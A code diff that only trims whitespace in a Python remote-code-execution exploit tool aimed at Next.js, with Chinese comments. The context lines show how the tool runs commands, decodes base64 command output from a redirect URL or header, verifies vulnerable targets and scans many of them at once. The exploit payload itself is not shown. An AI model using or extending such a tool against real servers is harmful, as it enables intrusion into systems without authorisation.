@@ -390,7 +390,7 @@ class NextJSRCEExploit:
         if not self.silent:
             print(f"[*] Using random path: {random_path}")
         return random_path
-        
+
     def execute_command(self, command, chunked=False):
         """
         执行系统命令并返回结果
@@ -597,14 +597,14 @@ class NextJSRCEExploit:
             return True, ''.join(all_output)
         else:
             return False, "分段读取失败，输出可能过长"
-    
+
     def _extract_result(self, redirect_url):
         """
         从重定向 URL 中提取并解码 base64 结果
-        
+
         Args:
             redirect_url: 重定向 URL 或 x-action-redirect 头的值
-            
+
         Returns:
             str: 解码后的命令执行结果
         """
@@ -612,12 +612,12 @@ class NextJSRCEExploit:
             # 提取参数 a 的值
             # 格式: /login?a=BASE64_DATA;push 或 /login?a=BASE64_DATA
             match = re.search(r'[?&]a=([^;&]+)', redirect_url)
-            
+
             if match:
                 encoded_data = match.group(1)
                 # URL 解码
                 encoded_data = unquote(encoded_data)
-                
+
                 # Base64 解码
                 try:
                     decoded = base64.b64decode(encoded_data).decode('utf-8', errors='ignore')
@@ -626,10 +626,10 @@ class NextJSRCEExploit:
                     return f"Base64 解码失败: {str(e)}\n原始数据: {encoded_data}"
             else:
                 return f"未找到参数 'a'。重定向 URL: {redirect_url}"
-                
+
         except Exception as e:
             return f"提取结果时出错: {str(e)}"
-    
+
     def verify_vulnerability(self):
         """
         验证漏洞是否存在（POC模式）
@@ -1996,7 +1996,7 @@ class NextJSRCEExploit:
                 break
 
 
-           
+
 
 
 
@@ -2127,7 +2127,7 @@ def batch_verify(targets_file, path=None, use_echo=True, use_dnslog=False, threa
 
     elapsed_time = time.time() - start_time
     write_queue.put(stop_writer)
-    writer.join() 
+    writer.join()
     # 输出总结
     print("\n" + "=" * 60)
     print("SUMMARY")
